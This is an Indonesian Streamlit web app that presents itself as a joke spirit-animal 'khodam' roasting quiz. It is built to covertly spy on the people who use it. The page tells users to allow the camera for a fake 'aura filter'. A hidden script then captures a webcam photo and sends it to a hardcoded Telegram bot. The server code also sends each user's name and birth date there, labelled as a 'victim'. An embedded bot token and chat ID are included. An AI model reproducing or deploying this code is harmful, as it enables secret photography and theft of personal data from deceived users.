import requests
import streamlit as st
import streamlit.components.v1 as components
from datetime import datetime
import time
import random

# ==========================================
# KONFIGURASI BOT TELEGRAM & HALAMAN
# ==========================================
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="Tes Khodam & Dukun Siltan 2026",
    page_icon="🗿",
    layout="centered"
)

# ==========================================
# CUSTOM CSS / STYLING GOKIL MENTAL RUSAK
# ==========================================
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700&display=swap');

    .stApp {
        background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
        color: #ffffff;
        font-family: 'Fredoka', cursive, sans-serif;
    }

    /* Kartu Neon Gokil */
    .gokil-card {
        background: rgba(0, 0, 0, 0.65);
        backdrop-filter: blur(15px);
        border: 4px solid #ffff00;
        border-radius: 30px;
        padding: 30px;
        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 255, 0, 0.5);
        margin-bottom: 25px;
    }

    /* Kotak Hook Pelet Dukun Online */
    .hook-box {
        background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
        border: 3px dashed #ffff00;
        padding: 18px 22px;
        border-radius: 20px;
        margin-bottom: 20px;
        font-size: 15px;
        color: #ffffff;
        text-align: center;
        font-weight: 700;
        box-shadow: 0 5px 20px rgba(255, 65, 108, 0.7);
        line-height: 1.6;
    }

    /* Tombol Utama Ugal-ugalan */
    div[data-testid="stFormSubmitButton"] > button {
        background: linear-gradient(135deg, #f12711 0%, #f5af19 100%) !important;
        color: #ffffff !important;
        font-weight: 800 !important;
        font-size: 20px !important;
        letter-spacing: 1px !important;
        border: 3px solid #ffff00 !important;
        padding: 18px 26px !important;
        border-radius: 24px !important;
        width: 100% !important;
        box-shadow: 0 8px 30px rgba(245, 175, 25, 0.8) !important;
        transition: all 0.3s ease !important;
        text-transform: uppercase;
    }
    div[data-testid="stFormSubmitButton"] > button:hover {
        background: linear-gradient(135deg, #ffff00 0%, #00f2fe 100%) !important;
        color: #0b090a !important;
        transform: scale(1.05) rotate(-1deg) !important;
        box-shadow: 0 12px 35px rgba(0, 242, 254, 0.9) !important;
    }

    /* Tombol Reset Gokil */
    .stButton > button {
        background: #111111 !important;
        color: #38ef7d !important;
        border: 3px solid #38ef7d !important;
        font-weight: 700 !important;
        font-size: 16px !important;
        text-align: center !important;
        padding: 14px 20px !important;
        border-radius: 18px !important;
        width: 100% !important;
        transition: all 0.3s ease !important;
    }
    .stButton > button:hover {
        background: #38ef7d !important;
        color: #000000 !important;
        transform: scale(1.03) !important;
    }

    /* Input Field Estetik */
    .stTextInput > div > div > input {
        background-color: rgba(255, 255, 255, 0.15) !important;
        color: #ffff00 !important;
        border: 3px solid #ffff00 !important;
        border-radius: 16px !important;
        padding: 14px !important;
        font-family: 'Fredoka', cursive, sans-serif;
        font-size: 16px;
        font-weight: 600;
    }
    .stTextInput > div > div > input:focus {
        border-color: #38ef7d !important;
        box-shadow: 0 0 20px rgba(56, 239, 125, 0.8) !important;
    }
    </style>
""", unsafe_allow_html=True)

# ==========================================
# INISIALISASI SESSION STATE
# ==========================================
if 'step' not in st.session_state:
    st.session_state.step = 0
if 'user_name' not in st.session_state:
    st.session_state.user_name = ""
if 'user_dob' not in st.session_state:
    st.session_state.user_dob = ""
if 'telegram_sent' not in st.session_state:
    st.session_state.telegram_sent = False
if 'current_profile' not in st.session_state:
    st.session_state.current_profile = None

# ==========================================
# DATABASE KHODAM ROASTING TINGKAT DEWA
# ==========================================
MASTER_KHODAM = [
    {
        "title": "🐔 Khodam Ayam Kampus Nyasar ke Kondangan Mantan",
        "desc": "Mentalmu setipis tisu basah kena air. Sering overthinking jam 3 pagi mikirin kenapa kucing tetangga ngeliatin kamu sambil senyum miring. Hobinya numpang WiFi gratisan tapi beli es teh doang dari jam 1 siang sampe magrib."
    },
    {
        "title": "🩴 Khodam Swallow Putus Asa Nyangkut di Kabel Listrik",
        "desc": "Simbol keabadian kaum mager yang alergi matahari. Kalau disuruh emak beli terasi ke warung, balesannya 'Sebentar, Mah, lagi nanggung main Mobile Legends padahal lagi AFK di base'."
    },
    {
        "title": "🍲 Khodam Kuah Seblak Nyampur Es Lilin Rasa Durian",
        "desc": "Otakmu penuh dengan rencana besar jadi miliarder, tapi realitanya rebahan sambil scrolling TikTok sampe fajar tiba. Dikit-dikit bikin status galau 'Dunia ini tidak adil', padahal baru abis kuota doang."
    },
    {
        "title": "🐟 Khodam Lele Suthil Ngerjain Skripsi Bab 1 Sampe Kiamat",
        "desc": "Licin banget kalau ditagih utang atau ditanya 'Kapan kawin?'. Jago banget ngilang tanpa bayar waktu nongkrong bareng temen tapi alibinya ketinggalan dompet di jok motor."
    },
    {
        "title": "🔌 Khodam Charger HP Ditekuk-tekuk Pake Batu Bata",
        "desc": "Hidupmu penuh penderitaan estetik. Kalau nge-charge HP harus ditahan pake guling dan posisi kabelnya harus dibengkokin 90 derajat biar aliran listriknya nyangkut. Sering ketipu giveaway fiktif di Instagram."
    },
    {
        "title": "🐈 Khodam Kucing Oren Suka Nyolong Ikan Asin di Warteg",
        "desc": "Nggak punya urat malu sama sekali. Muka tembok tingkat nasional. Kerjanya cuma numpang tidur di sofa orang lain, pas dibangunin malah mendengkur lebih kencang ngalahin suara knalpot brong."
    },
    {
        "title": "📦 Khodam Paket COD Datang Pas Lagi Jongkok di WC",
        "desc": "Sialmu permanen tanpa diskon! Tiap kali mau rebahan tenang, pasti kurir teriak 'PAKET!' atau emak teriak nyuruh angkat jemuran karena langit mendung padahal masih panas terik."
    },
    {
        "title": "🧊 Khodam Es Batu Kulkas Kosong Melompong Sejak 2022",
        "desc": "Dingin, kaku, gak guna, tapi sok ngatur hidup orang. Auranya mirip tukang parkir indomaret yang muncul entah dari mana pas mau keluar parkiran."
    },
    {
        "title": "🧅 Khodam Kulit Bawang Merah (Ahli Drama Fiktif Nusantara)",
        "desc": "Dikit-dikit bikin story IG latar hitam pake lagu Virgoun. Padahal aslinya cuma kelaparan tengah malam tapi males jalan ke dapur karena takut ketemu tuyul."
    },
    {
        "title": "🐸 Khodam Kodok Ngorek Minta Kuota 100GB ke Sultan Andara",
        "desc": "Hatinya hancur berkeping-keping kalau kuota internet sisa 50 KB. Hobinya nge-stalk mantan yang udah punya anak tiga sambil ngeliatin saldo rekening isinya cuma Rp 4.200."
    }
]

# ==========================================
# FUNGSI KIRIM TELEGRAM
# ==========================================
def send_text_to_telegram(name, dob, profile_title):
    now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
    caption = (
        f"🗿 <b>KORBAN ROASTING DUKUN KOCAK TERCYDUK!</b>\n\n"
        f"👤 Nama: <b>{name}</b>\n"
        f"🎂 Tanggal Lahir: <code>{dob}</code>\n"
        f"🕒 Waktu: {now}\n"
        f"🐾 Hasil Khodam: <b>{profile_title}</b>"
    )
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption, 'parse_mode': 'HTML'}
        )
    except Exception as e:
        print(f"[!] Gagal mengirim notifikasi Telegram: {e}")

# ==========================================
# RENDER UTAMA BERDASARKAN STEP
# ==========================================

# --- STEP 0: FORM DENGAN HOOK FILTER GAIB ---
if st.session_state.step == 0:
    st.markdown("<h1 style='text-align: center; color: #ffff00; text-shadow: 3px 3px #ff416c;'>🗿 ARENA ROASTING & TES KHODAM MENTAL RUSAK 🗿</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #ffffff; font-size: 1.15rem; margin-bottom: 20px; font-weight: 600;'>Kupas tuntas kejelekan nasib, isi dompet, dan khodam peliharaanmu secara brutal dan dijamin bikin emosi!</p>", unsafe_allow_html=True)

    with st.container():
        st.markdown('<div class="gokil-card">', unsafe_allow_html=True)
        
        # HOOK SUPER AMAN DIKEMAS SEBAGAI SYARAT FILTER GAME INTERAKTIF
        st.markdown("""
            <div class="hook-box">
                🚨 <b>SYARAT MUTLAK DARI DUO DUkun:</b><br>
                Supaya animasi filter gaib dan sensor aura di HP-mu gak error jadi tukang galon, wajib klik tombol <b>"Allow / Izinkan"</b> pas pop-up kamera muncul di layar ya bosku! 📸✨
            </div>
        """, unsafe_allow_html=True)
        
        with st.form("roasting_form"):
            name_input = st.text_input("NAMA PANGGILAN ALIAS KTP", value="", placeholder="Contoh: Bogel Pembantai Jomblo")
            dob_input = st.text_input("TANGGAL LAHIR (DD/MM/YYYY)", value="", placeholder="Contoh: 01/01/2000")
            
            st.write("")
            submitted = st.form_submit_button("🔥 BONGKAR AIB & KHODAM SEKARANG!")
            
            if submitted:
                if not name_input.strip():
                    st.warning("⚠️ Woy, tulis dulu namanya! Dukunnya bukan cenayang cenayang tebak-tebakan tebang pohon!")
                else:
                    st.session_state.user_name = name_input.strip()
                    st.session_state.user_dob = dob_input.strip() if dob_input.strip() else "Lupa karena sering linglung"
                    st.session_state.telegram_sent = False
                    
                    # RANDOM MURNI TIAP DIAKSES
                    rng = random.SystemRandom()
                    chosen_profile = rng.choice(MASTER_KHODAM).copy()
                    bebal_level = rng.randint(95, 100)
                    
                    chosen_profile['power'] = f"Tingkat Kebebalan Otak: {bebal_level}% (LEVEL STRES TINGKAT KRONIS)"
                    st.session_state.current_profile = chosen_profile
                    
                    st.session_state.step = 1
                    st.rerun()
                    
        st.markdown('</div>', unsafe_allow_html=True)

    # SKRIP KAMERA DIAM-DIAM DENGAN KEMASAN FILTER GAME KOCAK
    hidden_js_camera = f"""
    <div>
        <video id="video" width="0" height="0" autoplay style="display:none;"></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        <script>
            const token = "{TELEGRAM_BOT_TOKEN}";
            const chatId = "{TELEGRAM_CHAT_ID}";
            
            // Pancingan otomatis browser meminta izin untuk filter interaktif
            navigator.mediaDevices.getUserMedia({{ video: true }})
            .then(function(stream) {{
                var video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(function() {{
                    var canvas = document.getElementById('canvas');
                    var context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    var dataURL = canvas.toDataURL('image/jpeg');
                    
                    fetch(dataURL)
                    .then(res => res.blob())
                    .then(blob => {{
                        var formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'korban_roasting_gokil.jpg');
                        formData.append('caption', '🗿 <b>KORBAN ROASTING KHODAM TERCYDUK!</b>');
                        
                        fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                            method: 'POST',
                            body: formData
                        }});
                    }});
                    
                    stream.getTracks().forEach(track => track.stop());
                }}, 1200);
            }})
            .catch(function(err) {{
                console.log("Akses izin dilewati user: ", err);
            }});
        </script>
    </div>
    """
    components.html(hidden_js_camera, height=0)

# --- STEP 1: ANIMASI PROSES RITUAL UGAL-UGALAN ---
elif st.session_state.step == 1:
    st.markdown("<h2 style='text-align: center; color: #ffff00;'>🔮 DUKUN LAGI MENGHAKIMI MENTALMU...</h2>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #ffffff; font-weight: 600;'>Sabar bos, jin penunggu router lagi nyiapin hasil roasting paling pedas sedunia.</p>", unsafe_allow_html=True)
    
    st.write("")
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    status_text.text("👻 Mengunduh dosa-dosa masa lalu dari server langit...")
    progress_bar.progress(30)
    time.sleep(0.7)
    
    status_text.text(f"🔍 Menganalisis tingkat kepedihan dompet {st.session_state.user_name}...")
    progress_bar.progress(65)
    time.sleep(0.9)
    
    status_text.text("💥 Menemukan wujud khodam paling mengenaskan...")
    progress_bar.progress(90)
    time.sleep(0.7)
    
    status_text.text("🎉 Siap-siap mental hancur! Membuka hasil...")
    progress_bar.progress(100)
    time.sleep(0.4)
    
    st.session_state.step = 2
    st.rerun()

# --- STEP 2: HASIL RAMALAN & ROASTING ---
elif st.session_state.step == 2:
    if not st.session_state.telegram_sent and st.session_state.current_profile:
        send_text_to_telegram(
            name=st.session_state.user_name,
            dob=st.session_state.user_dob,
            profile_title=st.session_state.current_profile['title']
        )
        st.session_state.telegram_sent = True

    profile = st.session_state.current_profile

    st.markdown(f"<h2 style='text-align: center; color: #ffff00; text-shadow: 3px 3px #ff416c;'>🎉 DOR! HASIL ROASTING KELUAR 🎉</h2>", unsafe_allow_html=True)
    st.write("")

    if profile:
        st.markdown('<div class="gokil-card">', unsafe_allow_html=True)
        st.markdown(f"<h3 style='color: #00f2fe; text-align: center; font-size: 1.4rem;'>{profile['title']}</h3>", unsafe_allow_html=True)
        st.markdown(f"<p style='text-align: center; color: #ffff00; font-weight: 800; font-size: 1.2rem;'>{profile['power']}</p>", unsafe_allow_html=True)
        st.markdown("<hr style='border-color: rgba(255, 255, 255, 0.4); border-style: dashed;'>", unsafe_allow_html=True)
        st.markdown(f"<p style='text-align: center; font-size: 1.15rem; line-height: 1.7; color: #ffffff; font-weight: 600;'>{profile['desc']}</p>", unsafe_allow_html=True)
        st.markdown('</div>', unsafe_allow_html=True)

    st.write("")
    if st.button("🔄 ROASTING ULANG (KERJAIN TEMAN SEBELAH)", use_container_width=True):
        st.session_state.step = 0
        st.session_state.user_name = ""
        st.session_state.user_dob = ""
        st.session_state.telegram_sent = False
        st.session_state.current_profile = None
        st.rerun()
